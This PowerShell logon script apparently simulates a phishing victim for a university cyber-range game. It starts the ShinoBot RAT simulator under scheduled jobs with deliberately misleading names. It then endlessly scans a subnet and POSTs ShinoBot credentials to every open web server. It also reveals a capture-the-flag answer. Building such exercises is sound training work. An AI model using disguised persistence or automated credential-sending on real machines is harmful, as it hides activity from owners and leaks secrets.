<#
reveal-shinobot - A logon script for the Arena 1 in the UA Little Rock Cyber Gym.
 
This script starts shinobot and starts simulating authentication attempts using the ShinoBot 
credentials. Arena 1 includes a social engineering toolkit to capture credentials.
Users are intended to use the credentials on shinobotps1.com to deduct points in the
Arena. This script will continue to execute and try to send the credential payload to every
social engineering toolkit webserver in the Arena.

+---------------------------------------------------------------------------------------------+ 
| ORIGIN STORY                                                                                | 
+---------------------------------------------------------------------------------------------+ 
|   DATE        : 2020-11-30
|   AUTHOR      : Philip Huff 
|   DESCRIPTION : Initial Draft 
+---------------------------------------------------------------------------------------------+ 

+ Commands to set the startup job. The name is intended to be misleading.
$trigger = New-JobTrigger -AtLogon
Register-ScheduledJob -Trigger $trigger -FilePath C:\Windows\System32\sb\sb.ps1 -Name NetworkHealth
#>

function testport ($hostname, $port=80, $timeout=100) {
  $requestCallback = $state = $null
  $client = New-Object System.Net.Sockets.TcpClient
  $beginConnect = $client.BeginConnect($hostname,$port,$requestCallback,$state)
  Start-Sleep -milli $timeOut
  if ($client.Connected) { $open = $true } else { $open = $false }
  $client.Close()
  return $open
  [pscustomobject]@{hostname=$hostname;port=$port;open=$open}
}

Unregister-ScheduledJob -Name GetBatteryStatus
Register-ScheduledJob -RunNow -FilePath C:\Windows\System32\sb\sb_start.ps1 -Name GetBatteryStatus

Start-Sleep -Seconds 60
$shinohid = Get-ItemProperty -Path HKCU:\Software\ShinoBOT5 -Name HID
$shinopid = Get-ItemProperty -Path HKCU:\Software\ShinoBOT5 -Name PID
$Payload = @{"username"=$shinohid.HID; "password"=$shinopid.PID; "instructions"="Nice work. The flag is CyberGym{phish are biting}, but substitute these plus symbols with spaces. Now go to shinobotps1.com to deduct points from your opponents. Run the command found on that handy file on your Desktop."}

while ($true)
{
    for ($i = 0; $i -le 250; $i += 1)
    {
        for ($j = 3; $j -le 10; $j += 1)
        {
            $Target = "10.1.$i.$j"
            # $TestNet = Test-NetConnection $Target -Port 80
            if (testport -hostname $Target)
            {
                Invoke-WebRequest -Uri ("http://$Target") -Method POST -Body $Payload
            }
        }
    }
}
